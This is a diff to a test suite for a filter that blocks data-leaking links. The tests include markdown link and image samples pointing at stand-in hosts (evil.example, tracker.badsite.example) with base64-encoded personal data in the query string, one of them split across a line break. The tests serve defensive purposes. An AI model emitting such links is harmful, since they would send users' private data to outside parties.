@@ -51,3 +51,8 @@ test("payload split by tab or newline is rejoined like a browser would", () => {
   assert.ok(blocked("[x](https://evil.example/p?d=ZGFuYS5yZXll\r\nc0Bub3J0aHdpbmQ=)"));
   assert.equal(plug("Read https://docs.example.com/guide\nthen continue").findings.length, 0);
 });
+
+test("blocking keeps surrounding markdown and the next line intact", () => {
+  const r = plug("a\n![](https://tracker.badsite.example/p.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=)\nDocs: https://docs.example.com/x\n");
+  assert.equal(r.text, "a\n![]([blocked link to tracker.badsite.example])\nDocs: https://docs.example.com/x\n");
+});
